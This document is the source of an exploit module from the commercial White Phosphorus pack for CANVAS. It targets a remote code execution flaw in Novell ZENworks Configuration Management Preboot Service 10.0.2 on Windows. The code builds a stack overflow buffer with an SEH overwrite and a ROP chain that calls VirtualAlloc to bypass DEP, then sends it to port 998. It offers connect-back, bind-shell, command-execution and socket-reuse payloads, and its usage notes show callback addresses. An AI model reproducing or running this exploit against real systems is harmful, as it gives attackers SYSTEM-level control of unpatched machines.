
#! /usr/bin/env python
######################################################################################
# White Phosphorus Exploit Pack
#
# Proprietary source code - use only under the license agreement in distribution
#
######################################################################################


#Standard Imports
import sys 
sys.path.append(".")
sys.path.append("3rdparty/White_Phosphorus/libs")

import os
import socket
import sys
import time
from struct import *

# CANVAS modules
from wp_exploit import *
from wp_dialog import *
from wp_osversions import *
import canvasengine
from MOSDEF import mosdef 
from MOSDEF.mosdefutils import *
from MOSDEFShellServer import MosdefShellServer


######################################################################################
NAME = "Novell ZENworks Configuration Management Preboot Service"
DESCRIPTION = "Novell ZENworks Configuration Management Preboot Service 10.0.2 SYSTEM Remote Code Execution"
VERSION = "1.0"
DOCUMENTATION = {}
DOCUMENTATION['VENDOR']='Novell'
DOCUMENTATION["Date public"] = "2010-06-01"
DOCUMENTATION["Repeatability"] = "Multiple"
DOCUMENTATION['CVSS'] = 10.0
DOCUMENTATION["References"] = """
http://www.zerodayinitiative.com/advisories/ZDI-10-090/
http://www.novell.com/support/search.do?cmd=displayKC&docType=kc&externalId=7005572&sliceId=1&docTypeID=DT_TID_1_1&dialogID=138523325&stateId=0%200%20138517923
"""
DOCUMENTATION["Notes"] = """
"""

# Targets
PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2003"] 


NOTES="""
WP> White Phosphorus Exploit Pack
WP> Novell ZENworks Configuration Management Preboot Service
---------------------------------------------------------------------
Usage:
-T (check if target is vulnerable)
-v <version to target>
-t <target ip>   -p <target port>
-l <callback ip> -d <callback port>

Payload Options:
-O payload:<#>   (will use default if not specified)
-O command:<cmd> (for Execute Command payload)
-O bind:<port>   (for Bind MOSDEF Shell)

Versions:
0: Autoversioning
1: Windows DEP Bypass
2: Windows Other (Non DEP)

Payloads:
0: TCP Connect Back
1: Bind MOSDEF Shell
2: Execute Command
3: Socket Reuse

Example:
./commandlineInterface.py -p 5555 -v 17
./3rdparty/White_Phosphorus/exploits/wp_novell_zcm_preboot/wp_novell_zcm_preboot.py  -v 0 -t 10.1.1.10 -l 10.1.1.1 -d 5555 -O payload:0
"""

PORT = 998
######################################################################################

# Dialog Hooks
def dialog_update(gtk, wt):
    wp_dialog_update(gtk, wt, theexploit, targets, PORT)
    return

targets = {  
    0 : ["Autoversioning", (0x00000000), []],
    1 : ["Windows 2003 DEP Bypass", (0x00000000), [WIN2K3, WINXP]],
    2 : ["Windows Other (Non DEP)", (0x00000000 ), [WINALL]]
}

class theexploit(wp_exploit):
            ######################################################################################
            ## WP> Dialog Information
            ##########################s############################################################
    PAYLOADS=["TCP Connect Back",
              "Bind MOSDEF Shell",
              "Execute Command",
              "Socket Reuse"]

    DEFAULT_PAYLOAD = 3

    def __init__(self):
        tcpexploit.__init__(self)
        self.host = "127.0.0.1"
        self.port = PORT
        self.targets = targets
        self.version = 0
        self.badstring = "\x00\x09\x0a\x0d\x20"
        self.setInfo(DESCRIPTION)
        self.setInfo(VERSION)
        self.name = NAME
        self.autoVersioned = False
        self.use_universal = True
        self.startsock=4
        return

    def usage(self):
        self.wp_usage(targets)
        return  
    
    def test(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        
        return wp_bannerchecktest(self,self.host,self.port,{"2": 1},1000,"\r\n\r\n")
        
    def neededListenerTypes(self):
        self.getArgs()
        return self.wp_createWin32Listener()

    def createShellcode(self):
        self.getArgs()

        if self.version == 0:
            return 0

        self.log('WP> Targeting version %d: %s'%(self.version,targets[self.version][0]))
        return self.wp_createShellcode()    

    def getArgs(self):
        # Selected shell options
        self.wp_getShellcodeType()

        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        
        # Autoversioning OS/target detection
        if self.version == 0 and not self.autoVersioned:
            self.version = self.wp_autoVersionTarget(targets)
        return

    def displayVersions(self):
        for t in targets.keys():
            print 'WP> Version %d: %s'%(t,targets[t][0])
        return

    def makesploit(self):
        
        buffer = wp_randomstring(24)     #1120 is the max stack space
        if self.version == 1:
            buffer += pack('<L', 0x1001680B)   # PUSH ESP, POP ESI
            buffer += pack('<L', 0x10001040)   # POP EDI
            buffer += pack('<L', 0x10008E58)   # POP EBX,ECX,RET
            buffer += pack('<L', 0x10008A5F)   # PUSH ESI,POP EDI
            buffer += pack('<L', 0x10007A32)   # POP EAX
            buffer += pack('<L', 0x004250D4)   # VirtualAlloc Import
            buffer += pack('<L', 0x1001F97D)   # CALL [EAX]
            buffer += pack('<L', 0x00000400)   # Size
            buffer += pack('<L', 0x00001000)   # Type
            buffer += pack('<L', 0x00000040)   # Protect
            buffer += pack('<L', 0x58585858)   # Space
            buffer += pack('<L', 0x58585858)   # Space
            buffer += pack('<L', 0x58585858)   # Space
            buffer += pack('<L', 0x58585858)   # Space
            buffer += pack('<L', 0x58585858)   # Space
            buffer += pack('<L', 0x10007A52)   # PUSH ESP RET

            seh = pack('<L', 0x004107AB)     # ADD ESP,404
        elif self.version == 2:    
            seh= pack('<L', 0x00401180)   # PPR, novell-pbserv.exe
        
        buffer += self.shellcode
        
        buffer += wp_randomstring(1084- len(buffer)) # 1120 is the max stack space
        buffer += "\xeb\x06\x41\x42"       # jmp over
        buffer += seh
        buffer += "\xe9\xcf\xfb\xff\xff"    # jmp back
        buffer += wp_randomstring(1120 - len(buffer))
        
        payload = '\x00\x00\x00\x06'        # an operand
        payload += pack('>L', len(buffer))
        payload += buffer
        
        return payload


    def run(self):
        self.getArgs()

        if self.version == 0:
            self.log("WP> Autoversioning failed.")
            self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
            return 0
        
        
        payload = self.makesploit()
        
        self.result_error = 0
        
        try:
            s = self.gettcpsock()
            s.connect((self.host, self.port))

            self.log("WP> Sending Exploit")
            s.sendall(payload)
            
            if getattr(self, 'shell_REUSESOCKET',False) == False:
                s.close()

        except:
            self.log("WP> Attack reported no open socket - service died?")
            self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
            return 0        

        time.sleep(3)
        
        # Check if follow up is required for some shellcodes
        if self.result_error==0:
            ret = self.wp_postExploitShellcode(s)
            if ret:
                return ret

        ret=self.ISucceeded()
        self.setInfo("WP> %s attacking %s:%d - completed"%(NAME,self.host,self.port))
        return ret

if __name__== '__main__':
    print 'WP> Running White Phosphorus %s Exploit v %s'%(NAME,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
